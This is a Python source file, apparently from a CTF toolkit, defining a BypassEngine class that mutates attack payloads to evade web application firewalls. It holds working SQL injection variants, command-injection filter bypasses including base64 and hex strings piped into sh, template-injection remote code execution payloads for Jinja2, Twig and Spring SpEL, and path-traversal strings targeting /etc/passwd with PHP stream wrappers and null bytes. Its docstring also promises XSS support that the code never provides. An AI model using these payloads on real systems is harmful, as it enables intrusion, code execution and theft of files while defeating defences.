"""
WAF Bypass & Dynamic Payload Mutation Engine for WebCTF Suite.
Transforms payloads across SQLi, Command Injection, SSTI, LFI, and XSS
using multi-level obfuscation, encoding, and evasion heuristics.
"""

import re
import base64
import urllib.parse
from typing import List, Dict, Any, Optional

class BypassEngine:
    """
    Core engine for transforming offensive payloads to evade WAFs,
    blacklists, character filters, and signature inspection systems.
    """

    # ─── SQL INJECTION MUTATIONS ───────────────────────────────────────
    @staticmethod
    def mutate_sqli(payload: str, level: int = 2) -> List[Dict[str, str]]:
        """
        Generate mutated variations of an SQL injection payload.
        Levels:
          1: Comment splitting & Case randomization
          2: Hex encoding, Whitespace bypasses, Parenthesis wrapping
          3: Double encoding, Multi-byte UTF-8, Scientific notation
        """
        mutations = []
        
        # Level 1: Case alternation & Comment insertion
        def randomize_case(s: str) -> str:
            res = []
            keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY", "LIMIT", "GROUP", "CONCAT", "NULL"]
            words = s.split()
            for w in words:
                if w.upper() in keywords:
                    res.append("".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(w)))
                else:
                    res.append(w)
            return " ".join(res)

        case_mutated = randomize_case(payload)
        mutations.append({
            "name": "SQLi Case Variation",
            "payload": case_mutated,
            "desc": "Randomized keyword casing to evade case-sensitive string matching."
        })

        comment_mutated = re.sub(r"\s+", "/**/", payload)
        mutations.append({
            "name": "SQLi Inline Comments (/**/)",
            "payload": comment_mutated,
            "desc": "Replaces all whitespace with inline C-style comment blocks."
        })

        if level >= 2:
            # Whitespace alternatives (%0a, %0b, %0c, +)
            mutations.append({
                "name": "SQLi Line Feed Whitespace (%0a)",
                "payload": payload.replace(" ", "%0a"),
                "desc": "Uses URL-encoded linefeed in place of space character."
            })
            mutations.append({
                "name": "SQLi Tab Whitespace (%09)",
                "payload": payload.replace(" ", "%09"),
                "desc": "Uses horizontal tab character as whitespace separator."
            })
            mutations.append({
                "name": "SQLi Parenthesis Wrapping",
                "payload": re.sub(r"FROM\s+([A-Za-z0-9_]+)", r"FROM(\1)", re.sub(r"SELECT\s+(.+?)\s+FROM", r"SELECT(\1)FROM", payload, flags=re.IGNORECASE), flags=re.IGNORECASE),
                "desc": "Removes spaces around keywords by wrapping expressions in parentheses."
            })

            # Keyword splitting with inline comments (UNI/**/ON SEL/**/ECT)
            def split_keywords(s: str) -> str:
                for kw in ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR"]:
                    if len(kw) > 3:
                        mid = len(kw) // 2
                        repl = f"{kw[:mid]}/**/{kw[mid:]}"
                        s = re.sub(re.escape(kw), repl, s, flags=re.IGNORECASE)
                return s

            mutations.append({
                "name": "SQLi Keyword Splitting (UNI/**/ON)",
                "payload": split_keywords(payload),
                "desc": "Splits keyword tokens with inline comments to break string signatures."
            })

        if level >= 3:
            # Double URL encoding
            d_enc = urllib.parse.quote(urllib.parse.quote(payload))
            mutations.append({
                "name": "SQLi Double URL Encoding",
                "payload": d_enc,
                "desc": "Double percent-encoding to bypass front-end WAF unquote layers."
            })

            # Scientific notation bypass for numbers (0e0UNION)
            sci_mutated = re.sub(r"\bUNION\b", "0e0UNION", payload, flags=re.IGNORECASE)
            if sci_mutated != payload:
                mutations.append({
                    "name": "SQLi Scientific Notation (0e0UNION)",
                    "payload": sci_mutated,
                    "desc": "Injects floating point exponential literal to confuse parser."
                })

            # GBK Multi-byte UTF-8 quote bypass
            if "'" in payload:
                mutations.append({
                    "name": "SQLi Multi-Byte Char (%bf%27)",
                    "payload": payload.replace("'", "%bf%27"),
                    "desc": "Multi-byte characters swallow escaping backslashes in GBK/Big5 character sets."
                })

        return mutations

    # ─── COMMAND INJECTION MUTATIONS ──────────────────────────────────
    @staticmethod
    def mutate_command(cmd: str, level: int = 2) -> List[Dict[str, str]]:
        """
        Generate mutated variations of system commands to evade space/keyword filters.
        """
        mutations = []
        parts = cmd.split()
        if not parts:
            return mutations

        first = parts[0]
        rest = parts[1:] if len(parts) > 1 else []

        # Level 1: Classic Space Bypasses
        if rest:
            mutations.append({
                "name": "Cmd Space: ${IFS}",
                "payload": f"{first}${{IFS}}{'${IFS}'.join(rest)}",
                "desc": "Uses standard shell internal field separator."
            })
            mutations.append({
                "name": "Cmd Space: $IFS$9",
                "payload": f"{first}$IFS$9{'$IFS$9'.join(rest)}",
                "desc": "Uses $IFS with positional parameter 9 (safe delimiter)."
            })
            mutations.append({
                "name": "Cmd Space: Brace Expansion {cmd,args}",
                "payload": f"{{{','.join(parts)}}}",
                "desc": "Executes command using shell brace expansion without spaces."
            })
            if len(rest) == 1 and first in ["cat", "head", "tail", "more", "less"]:
                mutations.append({
                    "name": "Cmd Space: Redirection (<)",
                    "payload": f"{first}<{rest[0]}",
                    "desc": "Input redirection operator without whitespace."
                })

        # Level 2: String Concatenation & Encodings
        concat_first = "".join(f"{c}''" for c in first)
        concat_cmd = f"{concat_first} {' '.join(rest)}" if rest else concat_first
        mutations.append({
            "name": "Cmd String Concatenation (c''a''t)",
            "payload": concat_cmd,
            "desc": "Breaks keyword recognition using empty single quotes."
        })

        backslash_first = "\\".join(list(first))
        backslash_cmd = f"{backslash_first} {' '.join(rest)}" if rest else backslash_first
        mutations.append({
            "name": "Cmd Backslash Escape (c\\a\\t)",
            "payload": backslash_cmd,
            "desc": "Escapes literal characters using backslashes."
        })

        b64_str = base64.b64encode(cmd.encode()).decode()
        mutations.append({
            "name": "Cmd Base64 Pipe Execution",
            "payload": f"echo {b64_str}|base64 -d|sh",
            "desc": "Pipes base64 decoded string directly into shell interpreter."
        })

        hex_str = cmd.encode().hex()
        mutations.append({
            "name": "Cmd Hex Pipe Execution",
            "payload": f"echo {hex_str}|xxd -r -p|sh",
            "desc": "Converts hex-encoded string to raw shell command."
        })

        # Level 3: Wildcards, Variable Slicing & Octal Escapes
        if level >= 3:
            # Wildcard obfuscation (/???/c?t /???/p?ss??)
            def wildcardize(p: str) -> str:
                return "".join("?" if c.isalnum() else c for c in p)

            wildcard_cmd = " ".join(f"/???/{wildcardize(p.split('/')[-1])}" if "/" in p else wildcardize(p) for p in parts)
            mutations.append({
                "name": "Cmd Glob Wildcards (/???/c?t)",
                "payload": wildcard_cmd,
                "desc": "Replaces alphanumeric characters with shell glob wildcards."
            })

            # Substring slicing using environment variables
            mutations.append({
                "name": "Cmd Env Slicing (${PATH:0:1})",
                "payload": f"{first}${{PATH:0:1}}{'${PATH:0:1}'.join(rest)}" if rest else first,
                "desc": "Extracts slash or character separators from environment variables."
            })

            # Reverse pipe execution
            rev_cmd = cmd[::-1]
            mutations.append({
                "name": "Cmd Reversed Pipe (rev|sh)",
                "payload": f"echo '{rev_cmd}'|rev|sh",
                "desc": "Reverses command string and pipes through 'rev|sh'."
            })

        return mutations

    # ─── SSTI TEMPLATE MUTATIONS ──────────────────────────────────────
    @staticmethod
    def mutate_ssti(engine: str = "jinja2", cmd: str = "id", level: int = 2) -> List[Dict[str, str]]:
        """
        Generate mutated SSTI expressions to bypass keyword filters, dots, quotes, and brackets.
        """
        mutations = []
        eng = engine.lower()

        if "jinja" in eng or "python" in eng:
            # Level 1: Standard Cycler / Lipsum
            mutations.append({
                "name": "Jinja2 Lipsum Os Popen",
                "payload": f"{{{{ lipsum.__globals__['os'].popen('{cmd}').read() }}}}",
                "desc": "Standard Jinja2 RCE via lipsum globals."
            })

            # Level 2: Attribute Access Bypass (attr) - No brackets or dots
            mutations.append({
                "name": "Jinja2 attr() Bypass (No Dots)",
                "payload": f"{{{{ (lipsum|attr('__globals__'))|attr('get')('os')|attr('popen')('{cmd}')|attr('read')() }}}}",
                "desc": "Accesses object attributes using Jinja2 attr filter instead of dots."
            })

            # Query Parameter Pollution Bypass (request.args)
            mutations.append({
                "name": "Jinja2 Query Indirection (request.args)",
                "payload": f"{{{{ request|attr(request.args.g)|attr(request.args.o).popen(request.args.c).read() }}}}&g=__globals__&o=os&c={urllib.parse.quote(cmd)}",
                "desc": "Extracts blocked keywords from auxiliary URL parameters."
            })

            # String Concatenation Bypass
            mutations.append({
                "name": "Jinja2 String Concatenation ('__'+'class__')",
                "payload": f"{{{{ ().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['o'+'s'].popen('{cmd}').read() }}}}",
                "desc": "Splits restricted attribute and module names into concatenated fragments."
            })

            # Level 3: Format String & Hex Escapes (Zero Underscore, Zero Dot, Zero Bracket)
            if level >= 3:
                mutations.append({
                    "name": "Jinja2 Hex Underscore + Attr RCE (Zero Dots/Underscores/Brackets)",
                    "payload": r"{{ (lipsum|attr('\x5f\x5fglobals\x5f\x5f'))|attr('get')('os')|attr('popen')('" + cmd + r"')|attr('read')() }}",
                    "desc": "Complete WAF bypass evading dots, underscores, and bracket filters."
                })
                mutations.append({
                    "name": "Jinja2 Hex Underscore Escape (\\x5f\\x5f)",
                    "payload": r"{{ ()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')() }}",
                    "desc": "Replaces forbidden underscore characters with hex escape sequences."
                })



                # Jinja2 Format String Character Reconstruction
                mutations.append({
                    "name": "Jinja2 Format String (%c)",
                    "payload": f"{{{{ (lipsum|attr('%c%cglobals%c%c'|format(95,95,95,95)))['os'].popen('{cmd}').read() }}}}",
                    "desc": "Constructs double underscores using ASCII integer format specifiers."
                })


        elif "twig" in eng or "php" in eng:
            mutations.append({
                "name": "Twig Register Undefined Filter",
                "payload": f"{{{{ _self.env.registerUndefinedFilterCallback('exec') }}}}{{{{ _self.env.getFilter('{cmd}') }}}}",
                "desc": "Standard Twig RCE filter registration."
            })
            mutations.append({
                "name": "Twig Filter Map Array Bypass",
                "payload": f"{{{{ ['{cmd}']|filter('system') }}}}",
                "desc": "Executes system command via Twig array filter callback."
            })
            mutations.append({
                "name": "Twig Map Callback Bypass",
                "payload": f"{{{{ ['{cmd}']|map('passthru') }}}}",
                "desc": "Executes passthru via Twig array map callback."
            })

        elif "spel" in eng or "java" in eng:
            mutations.append({
                "name": "SpEL Runtime Exec",
                "payload": f"${{T(java.lang.Runtime).getRuntime().exec('{cmd}')}}",
                "desc": "Standard Spring Expression Language Runtime execution."
            })
            mutations.append({
                "name": "SpEL ProcessBuilder Array",
                "payload": f"${{new java.lang.ProcessBuilder(new String[]{{'/bin/sh','-c','{cmd}'}}).start()}}",
                "desc": "Uses ProcessBuilder to bypass simple Runtime.getRuntime() string signatures."
            })

        return mutations

    # ─── LFI / PATH TRAVERSAL MUTATIONS ───────────────────────────────
    @staticmethod
    def mutate_lfi(path: str = "/etc/passwd", level: int = 2) -> List[Dict[str, str]]:
        """
        Generate mutated traversal paths to bypass path sanitizers and extension appenders.
        """
        mutations = []
        clean_path = path.lstrip("/")

        # Level 1: Standard Traversal & Dot-Slash Padding
        mutations.append({
            "name": "LFI Standard Deep Traversal",
            "payload": f"../../../../../../../../{clean_path}",
            "desc": "Standard 8-level directory traversal escape."
        })
        mutations.append({
            "name": "LFI Dot-Slash Padding (././)",
            "payload": f".//.//.//.//.//.//.//.//{clean_path}",
            "desc": "Pads directory slashes with dot-slash sequences to defeat single pass strippers."
        })

        # Level 2: Nested Traversal & Stream Wrappers
        mutations.append({
            "name": "LFI Nested Traversal (....//)",
            "payload": f"....//....//....//....//....//....//{clean_path}",
            "desc": "Defeats non-recursive '../' sanitization filters (e.g. str_replace('../', ''))."
        })
        mutations.append({
            "name": "LFI Backslash Traversal (..\\\\)",
            "payload": f"..\\..\\..\\..\\..\\..\\..\\{clean_path}",
            "desc": "Windows / PHP path traversal using backslash separators."
        })
        mutations.append({
            "name": "LFI PHP Base64 Stream Wrapper",
            "payload": f"php://filter/convert.base64-encode/resource={clean_path}",
            "desc": "Bypasses PHP file execution by extracting raw source code in Base64."
        })
        mutations.append({
            "name": "LFI PHP ROT13 Stream Wrapper",
            "payload": f"php://filter/read=string.rot13/resource={clean_path}",
            "desc": "Extracts source code encoded in ROT13 to bypass keyword content inspection."
        })

        # Level 3: Encodings & Null-Byte Injection
        if level >= 3:
            mutations.append({
                "name": "LFI Double URL Encoded Traversal (%252e%252e%252f)",
                "payload": f"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{clean_path}",
                "desc": "Double URL encoded dot-dot-slash sequence."
            })
            mutations.append({
                "name": "LFI Overlong UTF-8 Encoding (%c0%ae)",
                "payload": f"%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{clean_path}",
                "desc": "Overlong 2-byte UTF-8 sequence for dot-dot-slash to bypass ASCII regex."
            })
            mutations.append({
                "name": "LFI Null-Byte Extension Termination (%00)",
                "payload": f"../../../../../../../../{clean_path}%00.png",
                "desc": "Null-byte poison to terminate hardcoded extension appenders (PHP < 5.3.4)."
            })
            mutations.append({
                "name": "LFI Path Truncation (/.)",
                "payload": f"../../../../../../../../{clean_path}" + "/." * 200,
                "desc": "Deep path truncation to exceed MAX_PATH buffer limit."
            })

        return mutations

    # ─── UNIVERSAL MUTATION DISPATCHER ─────────────────────────────────
    @classmethod
    def mutate_payload(cls, vuln_type: str, payload_or_cmd: str, level: int = 2, engine: str = "jinja2") -> List[Dict[str, str]]:
        """
        Universal entry point to generate mutated bypass variations for any vulnerability class.
        """
        v_low = vuln_type.lower()
        if "sql" in v_low:
            return cls.mutate_sqli(payload_or_cmd, level)
        elif "cmd" in v_low or "rce" in v_low or "exec" in v_low:
            return cls.mutate_command(payload_or_cmd, level)
        elif "ssti" in v_low or "template" in v_low:
            return cls.mutate_ssti(engine, payload_or_cmd, level)
        elif "lfi" in v_low or "traversal" in v_low or "file" in v_low:
            return cls.mutate_lfi(payload_or_cmd, level)
        else:
            # Fallback to command mutations
            return cls.mutate_command(payload_or_cmd, level)
